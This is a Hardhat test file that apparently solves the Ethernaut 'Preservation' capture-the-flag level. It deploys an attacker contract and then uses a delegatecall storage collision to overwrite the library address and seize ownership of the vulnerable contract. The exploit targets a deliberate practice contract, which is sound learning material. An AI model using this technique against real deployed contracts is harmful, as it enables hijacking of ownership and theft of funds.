import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";

import {
  Preservation,
  PreservationFactory,
  PreservationFactory__factory,
  Preservation__factory,
} from "../typechain-types";
import { MyPreservationAttack, MyPreservationAttack__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("16. Preservation", function () {
  let context: FixtureContext;
  let level: FixtureLevel<PreservationFactory, Preservation>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, PreservationFactory__factory, (address, signer) =>
      Preservation__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully", async function () {
    // deploy attacker contract
    const attackFactory: MyPreservationAttack__factory = new MyPreservationAttack__factory(context.player);
    const attackContract: MyPreservationAttack = await attackFactory.deploy();
    await attackContract.waitForDeployment();

    const fakeLibAddress = await attackContract.getAddress();

    // call second library, it will overwrite 0th slot in storage with address of fake library
    const tx1 = await level.instance.setSecondTime(BigInt(fakeLibAddress));
    await expect(tx1).to.not.be.reverted;
    await tx1.wait();

    expect(await level.instance.timeZone1Library()).to.be.eq(fakeLibAddress);

    // call first library, faked by us: it will overwrite slots 0-2 in storage, where slot #2 contains owner address
    const tx2 = await level.instance.setFirstTime(0);
    await expect(tx2).to.not.be.reverted;
    await tx2.wait();

    // check owner is player
    expect(await level.instance.owner()).to.be.eq(context.player);

    await completeLevel(context, level);
  });
});
